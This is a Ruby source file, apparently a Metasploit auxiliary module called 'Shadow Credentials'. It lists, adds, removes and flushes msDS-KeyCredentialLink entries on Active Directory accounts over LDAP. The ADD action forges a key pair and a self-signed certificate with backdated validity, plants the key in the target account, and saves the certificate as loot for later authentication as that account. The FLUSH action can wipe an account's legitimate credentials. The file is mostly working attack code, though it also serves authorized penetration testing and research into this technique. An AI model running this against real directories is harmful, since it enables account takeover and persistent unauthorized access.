##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::LDAP
  include Msf::OptionalSession::LDAP

  ATTRIBUTE = 'msDS-KeyCredentialLink'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Shadow Credentials',
        'Description' => %q{
          This module can read and write the necessary LDAP attributes to configure a particular account with a
          Key Credential Link. This allows weaponising write access to a user account by adding a certificate
          that can subsequently be used to authenticate. In order for this to succeed, the authenticated user
          must have write access to the target object (the object specified in TARGET_USER).
        },
        'Author' => [
          'Elad Shamir', # Original research
          'smashery' # module author
        ],
        'References' => [
          ['URL', 'https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab'],
          ['URL', 'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          ['FLUSH', { 'Description' => 'Delete all certificate entries' }],
          ['LIST', { 'Description' => 'Read all credentials associated with the account' }],
          ['REMOVE', { 'Description' => 'Remove matching certificate entries from the account object' }],
          ['ADD', { 'Description' => 'Add a credential to the account' }]
        ],
        'DefaultAction' => 'LIST',
        'Notes' => {
          'Stability' => [],
          'SideEffects' => [CONFIG_CHANGES], # REMOVE, FLUSH, ADD all make changes
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGET_USER', [ true, 'The target to write to' ]),
      OptString.new('DEVICE_ID', [ false, 'The specific certificate ID to operate on' ], conditions: %w[ACTION == REMOVE]),
    ])
  end

  def fail_with_ldap_error(message)
    ldap_result = @ldap.get_operation_result.table
    return if ldap_result[:code] == 0

    print_error(message)
    if ldap_result[:code] == 16
      fail_with(Failure::NotFound, 'The LDAP operation failed because the referenced attribute does not exist. Ensure you are targeting a domain controller running at least Server 2016.')
    else
      validate_query_result!(ldap_result)
    end
  end

  def warn_on_likely_user_error
    ldap_result = @ldap.get_operation_result.table
    if ldap_result[:code] == 50
      if (datastore['LDAPUsername'] == datastore['TARGET_USER'] ||
          datastore['LDAPUsername'] == datastore['TARGET_USER'] + '$') &&
         datastore['LDAPUsername'].end_with?('$') &&
         ['add', 'remove'].include?(action.name.downcase)
        print_warning('By default, computer accounts can only update their key credentials if no value already exists. If there is already a value present, you can remove it, and add your own, but any users relying on the existing credentials will not be able to authenticate until you replace the existing value(s).')
      elsif datastore['LDAPUsername'] == datastore['TARGET_USER'] && !datastore['LDAPUsername'].end_with?('$')
        print_warning('By default, only computer accounts can modify their own properties (not user accounts).')
      end
    end
  end

  def ldap_get(filter, attributes: [])
    raw_obj = @ldap.search(base: @base_dn, filter: filter, attributes: attributes).first
    return nil unless raw_obj

    obj = {}

    obj['dn'] = raw_obj['dn'].first.to_s
    unless raw_obj['sAMAccountName'].empty?
      obj['sAMAccountName'] = raw_obj['sAMAccountName'].first.to_s
    end

    unless raw_obj['ObjectSid'].empty?
      obj['ObjectSid'] = Rex::Proto::MsDtyp::MsDtypSid.read(raw_obj['ObjectSid'].first)
    end

    unless raw_obj[ATTRIBUTE].empty?
      result = []
      raw_obj[ATTRIBUTE].each do |entry|
        dn_binary = Rex::Proto::LDAP::DnBinary.decode(entry)
        struct = Rex::Proto::MsAdts::MsAdtsKeyCredentialStruct.read(dn_binary.data)
        result.append(Rex::Proto::MsAdts::KeyCredential.from_struct(struct))
      end
      obj[ATTRIBUTE] = result
    end

    obj
  end

  def run
    ldap_connect do |ldap|
      validate_bind_success!(ldap)

      if (@base_dn = datastore['BASE_DN'])
        print_status("User-specified base DN: #{@base_dn}")
      else
        print_status('Discovering base DN automatically')

        if (@base_dn = ldap.base_dn)
          print_status("#{ldap.peerinfo} Discovered base DN: #{@base_dn}")
        else
          print_warning("Couldn't discover base DN!")
        end
      end
      @ldap = ldap

      begin
        target_user = datastore['TARGET_USER']
        obj = ldap_get("(sAMAccountName=#{target_user})", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
        if obj.nil? && !target_user.end_with?('$')
          obj = ldap_get("(sAMAccountName=#{target_user}$)", attributes: ['sAMAccountName', 'ObjectSID', ATTRIBUTE])
        end
        fail_with(Failure::NotFound, "Failed to find sAMAccountName: #{target_user}") unless obj

        send("action_#{action.name.downcase}", obj)
      rescue ::IOError => e
        fail_with(Failure::UnexpectedReply, e.message)
      end
    end
  rescue Errno::ECONNRESET
    fail_with(Failure::Disconnected, 'The connection was reset.')
  rescue Rex::ConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
    fail_with(Failure::NoAccess, e.message)
  rescue Net::LDAP::Error => e
    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
  end

  def action_list(obj)
    credential_entries = obj[ATTRIBUTE]
    if credential_entries.nil?
      print_status("The #{ATTRIBUTE} field is empty.")
      return
    end
    print_status('Existing credentials:')
    credential_entries.each do |credential|
      print_status("DeviceID: #{credential.device_id} - Created #{credential.key_creation_time}")
    end
  end

  def action_remove(obj)
    credential_entries = obj[ATTRIBUTE]
    if credential_entries.nil? || credential_entries.empty?
      print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
      return
    end

    length_before = credential_entries.length
    credential_entries.delete_if { |entry| entry.device_id.to_s == datastore['DEVICE_ID'] }
    if credential_entries.length == length_before
      print_status('No matching entries found - check device ID')
    else
      update_list = credentials_to_ldap_format(credential_entries, obj['dn'])
      unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, update_list)
        warn_on_likely_user_error
        fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
      end
      print_good("Deleted entry with device ID #{datastore['DEVICE_ID']}")
    end
  end

  def action_flush(obj)
    unless obj[ATTRIBUTE]
      print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
      return
    end

    unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
      fail_with_ldap_error("Failed to deleted the #{ATTRIBUTE} attribute.")
    end

    print_good("Successfully deleted the #{ATTRIBUTE} attribute.")
  end

  def action_add(obj)
    credential_entries = obj[ATTRIBUTE]
    if credential_entries.nil?
      credential_entries = []
    end
    key, cert = generate_key_and_cert(datastore['TARGET_USER'])
    credential = Rex::Proto::MsAdts::KeyCredential.new
    credential.set_key(key.public_key, Rex::Proto::MsAdts::KeyCredential::KEY_USAGE_NGC)
    now = ::Time.now
    credential.key_approximate_last_logon_time = now
    credential.key_creation_time = now
    credential_entries.append(credential)
    update_list = credentials_to_ldap_format(credential_entries, obj['dn'])

    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, update_list)
      warn_on_likely_user_error
      fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
    end

    pkcs12 = OpenSSL::PKCS12.create('', '', key, cert)
    store_cert(pkcs12)

    print_good("Successfully updated the #{ATTRIBUTE} attribute; certificate with device ID #{credential.device_id}")
  end

  def store_cert(pkcs12)
    service_data = ldap_service_data
    credential_data = {
      **service_data,
      address: service_data[:host],
      port: rport,
      protocol: service_data[:proto],
      service_name: service_data[:name],
      workspace_id: myworkspace_id,
      username: datastore['TARGET_USER'],
      private_type: :pkcs12,
      # pkcs12 is a binary format, but for persisting we Base64 encode it
      private_data: Base64.strict_encode64(pkcs12.to_der),
      origin_type: :service,
      module_fullname: fullname
    }
    create_credential(credential_data)

    info = "#{datastore['LDAPDomain']}\\#{datastore['TARGET_USER']} Certificate"
    stored_path = store_loot('windows.ad.cs', 'application/x-pkcs12', rhost, pkcs12.to_der, 'certificate.pfx', info)
    print_status("Certificate stored at: #{stored_path}")
  end

  def ldap_service_data
    {
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'ldap',
      info: "Module: #{fullname}, #{datastore['LDAP::AUTH']} authentication"
    }
  end

  def credentials_to_ldap_format(entries, dn)
    entries.map do |entry|
      struct = entry.to_struct
      dn_binary = Rex::Proto::LDAP::DnBinary.new(dn, struct.to_binary_s)

      dn_binary.encode
    end
  end

  def generate_key_and_cert(subject)
    key = OpenSSL::PKey::RSA.new(2048)
    cert = OpenSSL::X509::Certificate.new
    cert.public_key = key.public_key
    cert.issuer = OpenSSL::X509::Name.new([['CN', subject]])
    cert.subject = OpenSSL::X509::Name.new([['CN', subject]])
    yr = 24 * 3600 * 365
    cert.not_before = Time.at(Time.now.to_i - rand(yr * 3) - yr)
    cert.not_after = Time.at(cert.not_before.to_i + (rand(4..9) * yr))
    cert.sign(key, OpenSSL::Digest.new('SHA256'))

    [key, cert]
  end
end
